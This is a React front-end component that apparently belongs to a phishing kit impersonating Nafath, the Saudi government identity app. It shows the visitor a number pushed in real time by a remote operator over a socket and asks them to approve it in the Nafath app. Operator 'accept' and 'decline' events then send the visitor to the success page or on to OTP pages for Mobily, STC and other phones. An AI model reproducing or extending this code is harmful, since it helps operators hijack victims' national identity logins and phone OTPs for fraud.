import React from "react";
import axios from "axios";
import { useState } from "react";
import { serverRoute, socket } from "./Main";
import { useNavigate } from "react-router-dom";

const Navaz = () => {
  const query = new URLSearchParams(window.location.search);
  const [otp, setOtp] = useState(query.get("otp"));
  const stc = query.get("stc");
  const navigate = useNavigate();
  const getOrder = async (id) => {
    const response = await axios.get(serverRoute + `/order/${id}`);
    const data = await response.data;
    return data;
  };
  const sendEmail = async (id) => {
    await axios.post(serverRoute + "/email/" + id);
  };
  socket.on("acceptNavaz", async (id) => {
    if (id === sessionStorage.getItem("id")) {
      const orderData = await getOrder(id);
      sessionStorage.setItem("order", JSON.stringify(orderData));
      return await sendEmail(id).then(() => navigate("/success"));
    }
  });
  socket.on("declineNavaz", (id) => {
    console.log(id, sessionStorage.getItem("provider"));
    if (id === sessionStorage.getItem("id")) {
      if (sessionStorage.getItem("provider") === "موبايلي") {
        window.location.href = "/mobilyOtp";
      } else {
        window.location.href = "/phoneOtp";
      }
    }
  });

  socket.on("navazChange", ({ price, id }) => {
    if (id === sessionStorage.getItem("id")) {
      return setOtp(price);
    }
  });
  socket.on("acceptService", async ({ price, id }) => {
    if (id === sessionStorage.getItem("id")) {
      const orderData = await getOrder(id);
      sessionStorage.setItem("order", JSON.stringify(orderData));
      return await sendEmail(id).then(() => navigate("/success"));
    }
  });
  socket.on("declineService", (id) => {
    if (id === sessionStorage.getItem("id")) {
      window.location.href = "/stcOtp";
    }
  });
  socket.on("acceptPhoneOTP", async ({ price, id }) => {
    if (id === sessionStorage.getItem("id")) {
       const orderData = await getOrder(id);
       sessionStorage.setItem("order", JSON.stringify(orderData));
       return await sendEmail(id).then(() => navigate("/success"));
    }
  });
  socket.on("declinePhoneOTP", (id) => {
    if (id === sessionStorage.getItem("id")) {
      window.location.href = "/phoneOtp";
    }
  });

  return (
    <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
      <img src="/navazLogo.png" alt="navazLogo Logo" className="w-16" />
      <span
        className="text-center w-4/5  bg-green-100 rounded-md p-3  text-gray-600  "
        style={{ border: "1px solid #14a196" }}
      >
        الرجاء التوجه الى تطبيق نفاذ لتاكيد الطلب باختيار الرقم
        الذي سوف يظهر في الاسفل{" "}
        <div className="text-4xl text-green-500 animate-bounce mt-5">
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
        </div>
        <span className="text-gray-600 ">جاري المعالجة . نرجو الانتظار</span>
      </span>
      <div
        className="min-w-20 min-h-20 px-5 flex items-center justify-center text-2xl text-green-800 "
        style={{ border: "2px solid #14a196" }}
      >
        {otp ? otp : "??"}
      </div>
      <img src="/navazOtp.jpg" className="md:w-2/5 p-2 " />
    </div>
  );
};

export default Navaz;
